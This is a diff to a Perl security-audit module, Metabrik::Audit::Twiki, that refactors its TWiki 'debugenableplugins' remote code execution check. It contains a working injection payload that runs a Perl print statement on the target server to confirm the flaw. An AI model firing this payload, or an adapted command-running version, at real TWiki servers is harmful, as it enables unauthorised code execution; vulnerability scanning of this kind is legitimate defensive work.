@@ -7,7 +7,7 @@ package Metabrik::Audit::Twiki;
 use strict;
 use warnings;
 
-use base qw(Metabrik);
+use base qw(Metabrik::Client::Www);
 
 sub brik_properties {
    return {
@@ -16,33 +16,31 @@ sub brik_properties {
       author => 'GomoR <GomoR[at]metabrik.org>',
       license => 'http://opensource.org/licenses/BSD-3-Clause',
       attributes => {
-         url_paths => [ qw($path_list) ],
          target => [ qw(uri) ],
+         url_paths => [ qw($path_list) ],
       },
       attributes_default => {
-         url_paths => [ '/' ],
          target => 'http://localhost/',
+         url_paths => [ '/' ],
       },
       commands => {
-         debugenableplugins_rce => [ ],
-      },
-      require_modules => {
-         'WWW::Mechanize' => [ ],
+         debugenableplugins_rce => [ qw(target|OPTIONAL url_path_list|OPTIONAL) ],
       },
    };
 }
 
 sub debugenableplugins_rce {
    my $self = shift;
+   my ($target, $url_paths) = @_;
 
-   my $target = $self->target;
-   my $url_paths = $self->url_paths;
+   $target ||= $self->target;
+   $url_paths ||= $self->url_paths;
+   $self->brik_help_run_undef_arg('debugenableplugins_rce', $target) or return;
+   $self->brik_help_run_undef_arg('debugenableplugins_rce', $url_paths) or return;
+   $self->brik_help_run_undef_arg('debugenableplugins_rce', $url_paths, 'ARRAY') or return;
+
    my $exploit = '?debugenableplugins=BackupRestorePlugin%3bprint("Content-Type:text/html'.
       "\r\n\r\n".'Vulnerable TWiki Instance")%3bexit';
-
-   if (ref($url_paths) !~ /ARRAY/) {
-      return $self->log->error("debugenableplugins_rce: url_paths must be ARRAYREF");
-   }
 
    $target =~ s/\/*$//;
 
@@ -50,15 +48,14 @@ sub debugenableplugins_rce {
       $url_path =~ s/^\/*//;
 
       my @users = ();
-      my $mech = WWW::Mechanize->new;
 
       my $url = $target.'/'.$url_path.$exploit;
 
-      $self->log->verbose("url[$url]");
+      $self->log->verbose("debugenableplugins_rce: testing url: [$url]");
 
-      $mech->get($url);
-      if ($mech->status == 200) {
-         my $decoded = $mech->response->decoded_content;
+      my $r = $self->get($url) or next;
+      if ($r->{code} == 200) {
+         my $decoded = $r->{content};
          $self->log->verbose($decoded);
          if ($decoded =~ /Vulnerable TWiki Instance/i) {
             $self->log->info("Vulnerable");
